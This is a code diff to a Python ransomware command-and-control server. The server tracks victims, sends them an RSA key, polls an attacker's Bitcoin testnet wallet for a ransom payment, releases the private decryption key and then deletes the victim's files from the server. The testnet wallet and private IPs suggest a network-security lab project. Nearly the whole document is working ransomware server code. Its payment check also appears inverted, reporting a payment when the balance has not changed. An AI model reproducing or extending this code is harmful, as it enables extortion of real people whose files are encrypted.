@@ -8,12 +8,14 @@ import base64
 import logging
 import socket
 import os
-import subprocess
 import errno
 import time
 from getmac import get_mac_address
 import cryptowallet
 import rsa
+import shutil
+import requests
+import re
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -21,7 +23,7 @@ class Server:
     """
    
     FORMAT = 'utf-8'
-    IP_ADDR = '10.0.2.5'
+    IP_ADDR = '10.0.2.15'
     MAX_SIZE = 4096
     VICTIMS = []
     WORKING_DIR = '/home/netsec/server'
@@ -30,7 +32,7 @@ class Server:
 
     global initial_balance, WALLET_ADDRESS, bitcoin_needed 
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
-    initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
+    # initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
     bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed
 
     def __init__(self, port):
@@ -70,7 +72,22 @@ class Server:
             print('Server was not initialized due to an error.')
 
 
+    def get_balance(self, wallet_address):
+    
+        # API endpoint URL for retrieving wallet balance from blockchain.com API
+        balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
+        decimal_pattern = r'\d+\.\d+'
 
+
+        # Make API request to retrieve wallet balance
+        response = requests.get(balance_url)
+        if response.status_code == 200:
+            response_text = response.text
+            index =  response_text.find("balance of")
+            balance_str = response_text[index+11:index + 20]
+            match = re.search(decimal_pattern, balance_str)
+            balance = float(match.group())
+        return balance
     
     def make_dir(self, dir_name):
         path = os.path.join(Server.WORKING_DIR, dir_name)
@@ -120,20 +137,29 @@ class Server:
 
 
     #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
-    def check_if_user_paid(self):
+    def check_if_user_paid(self, initial_balance):
         
-        current_balance =  cryptowallet.get_balance(WALLET_ADDRESS)
+        current_balance =  self.get_balance(WALLET_ADDRESS)
 
-        amount_paid = current_balance - initial_balance 
+        # amount_paid = current_balance - initial_balance 
         
-        paid  =  amount_paid == 0
+        # paid  =  amount_paid == 0
 
-        return paid
+        # return paid
+
+        change = current_balance - initial_balance
+
+        if (change == 0):
+            print(bitcoin_needed)
+            return True
+        else:
+            initial_balance = current_balance
+            return False
     
-    # def remove_victim_files_from_server(self, mac):
-    #     path = os.path.join(Server.WORKING_DIR, mac)
-    #     shutil.rmtree(path)
-    #     print("all files in the victim directory has been removed")
+    def remove_victim_files_from_server(self, mac):
+        path = os.path.join(Server.WORKING_DIR, mac)
+        shutil.rmtree(path)
+        print("all files in the victim directory has been removed")
 
     def attack(self):
         # Establish a connection with the client.
@@ -166,10 +192,6 @@ class Server:
                     file = open(os.path.join(victim_dir, 'public_key.pem'), "rb")
                     key_data = file.read()
                     key = base64.b64encode(key_data)
-
-
-
-                    
                     connection.sendall(key)
                     msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                     print("[CLIENT]: "+msg)
@@ -188,9 +210,10 @@ class Server:
                     #Every 5 seconds check if victim paid, if they did send them a message
                     time.sleep(5)
                     # paid = self.check_if_user_paid()
+                    initial_balance = self.get_balance(WALLET_ADDRESS)
 
 
-                    if(True):
+                    if(self.check_if_user_paid(initial_balance)):
                         # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
@@ -210,12 +233,18 @@ class Server:
                         connection.sendall(base64.b64encode(data))
                         msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
                         print("[CLIENT]: "+msg)
-                        
-                        """ Deleting the victim file from server """
-                        # self.remove_victim_files_from_server(victim_mac)
 
                         """ Closing the file. """
                         file.close()  
+
+                        while True:
+
+                            msg = base64.b64decode(connection.recv(Server.MAX_SIZE)).decode(Server.FORMAT)
+
+                            """ Deleting the victim file from server """
+                            if msg == 'x':
+                                self.remove_victim_files_from_server(victim_mac)
+                            break
                         break
                     break
                     
